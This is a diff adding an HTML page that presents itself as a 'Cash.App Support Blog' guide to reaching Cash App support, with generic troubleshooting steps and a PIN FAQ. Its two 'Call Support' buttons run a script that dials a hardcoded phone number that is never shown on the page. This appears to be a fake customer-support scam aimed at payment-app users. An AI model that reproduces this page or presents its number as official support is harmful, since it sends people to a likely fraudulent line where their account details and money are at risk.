@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Cash.App Support Guide - Solutions, FAQs, and tips for resolving issues.">
+    <title>How to Reach Cash.App Support</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="script.js"></script>
+</head>
+
+<body>
+    <!-- Sticky Header and Navigation -->
+    <header>
+        <nav class="navbar">
+            <a href="#home" class="nav-link">Home</a>
+            <a href="#support" class="nav-link">Support</a>
+            <a href="#faq" class="nav-link">FAQ</a>
+            <a href="#contact" class="nav-link">Contact</a>
+        </nav>
+    </header>
+
+    <div class="container">
+        <!-- Hero Section -->
+        <section id="home" class="hero">
+            <h1>Contacting Cash.App Support</h1>
+            <p>Find troubleshooting tips, FAQs, and support solutions to resolve Cash.App-related concerns effectively.</p>
+        </section>
+
+        <!-- Support Section -->
+        <section id="support" class="section">
+            <h2>Cash.App Customer Support</h2>
+            <p>While Cash.App simplifies sending money, paying bills, and investments, users may face occasional issues. Here's a step-by-step guide to resolving these problems and contacting support.</p>
+
+            <!-- Call to Action -->
+            <div class="cta-container">
+                <button onclick="autoDial()" class="cta-button">Call Support</button>
+            </div>
+
+            <h2>1. Contacting Support Through the Cash.App</h2>
+            <p>The easiest way to get help is through the app’s built-in support feature. Follow these steps:</p>
+
+            <h3>Steps to Use In-App Support:</h3>
+            <ul>
+                <li><strong>Launch the App:</strong> Open Cash.App on your mobile device.</li>
+                <li><strong>Access Profile:</strong> Tap the profile icon at the top-left corner.</li>
+                <li><strong>Go to Support:</strong> Scroll down and select <strong>"Support"</strong> or <strong>"Cash Support"</strong>.</li>
+                <li><strong>Search FAQs:</strong> Review the list of common issues and their solutions.</li>
+                <li><strong>Select "Something Else":</strong> If no solution fits, choose <strong>"Something Else"</strong> to find more detailed options.</li>
+                <li><strong>Contact Support:</strong> If needed, use the <strong>"Contact Support"</strong> option to start a chat with the Cash.App support team.</li>
+                <li><strong>Provide Details:</strong> Be prepared to share transaction IDs, error messages, or account information for faster resolution.</li>
+            </ul>
+
+            <h2>2. Using the Cash.App Website</h2>
+            <p>You can also reach support via the official website, especially when you don’t have the app handy.</p>
+
+            <h3>Steps for Website Support:</h3>
+            <ul>
+                <li><strong>Visit the Help Center:</strong> Open the official Cash.App Help Center in your browser.</li>
+                <li><strong>Search for Solutions:</strong> Use the search tool to find articles about your issue, like payment failures or security concerns.</li>
+                <li><strong>Submit a Request:</strong> If you still need help, scroll down to find the <strong>"Contact Support"</strong> option or use the provided support form.</li>
+            </ul>
+
+            <h2>3. Social Media Support</h2>
+            <p>Cash.App is active on social platforms where you can reach out for assistance.</p>
+
+            <h3>Twitter:</h3>
+            <ul>
+                <li><strong>Contact on Twitter:</strong> Send a tweet or DM to the official Cash.App Twitter handle for quick support.</li>
+            </ul>
+
+            <h3>Facebook:</h3>
+            <ul>
+                <li><strong>Message on Facebook:</strong> Visit Cash.App’s official Facebook page and send a private message with the issue details.</li>
+            </ul>
+
+            <!-- Call to Action -->
+            <div class="cta-container">
+                <button onclick="autoDial()" class="cta-button">Call Support</button>
+            </div>
+
+            <h3>Resolving Payment Issues</h3>
+            <p>Common payment problems can often be fixed by:</p>
+            <ul>
+                <li>Updating the Cash.App to the latest version.</li>
+                <li>Ensuring you have sufficient funds in your balance.</li>
+                <li>Verifying that your linked card is active and valid.</li>
+                <li>Checking your internet connection.</li>
+                <li>Contacting support if the issue persists.</li>
+            </ul>
+        </section>
+
+        <!-- Troubleshooting Section -->
+        <section id="expanded-troubleshooting" class="section">
+            <h2>Advanced Troubleshooting</h2>
+            <h3>Addressing Account Verification Problems</h3>
+            <ul>
+                <li>Double-check that your submitted details are correct.</li>
+                <li>Upload clear photos of valid identification.</li>
+                <li>Wait patiently as verifications may take some time.</li>
+            </ul>
+        </section>
+
+        <!-- FAQ Section -->
+        <section id="faq" class="section">
+            <h2>FAQs</h2>
+            <div class="faq-item">
+                <h3>How can I reset my PIN on Cash.App?</h3>
+                <ol>
+                    <li>Go to the "Profile" section.</li>
+                    <li>Select "Security" > "Change PIN".</li>
+                    <li>Follow the on-screen instructions.</li>
+                </ol>
+            </div>
+        </section>
+
+        <!-- Contact Section -->
+        <section id="contact" class="section">
+            <h2>How to Reach Cash.App Support</h2>
+            <p>Here are your options for contacting Cash.App support:</p>
+            <ul>
+                <li>Access the “Support” section within the Cash.App mobile app.</li>
+                <li>Call the phone number provided in the app.</li>
+                <li>Visit the official Cash.App Help Center for further guidance.</li>
+            </ul>
+        </section>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <p>&copy; 2024 Cash.App Support Blog. All Rights Reserved.</p>
+        <p><a href="https://www.cash.app/support" target="_blank">Visit Cash.App Official Support</a></p>
+    </footer>
+
+    <!-- Auto Dial Script -->
+    <script>
+        function autoDial() {
+            const phoneNumber = "+18083011362";
+            window.location.href = `tel:${phoneNumber}`;
+        }
+    </script>
+
+</body>
+
+</html>
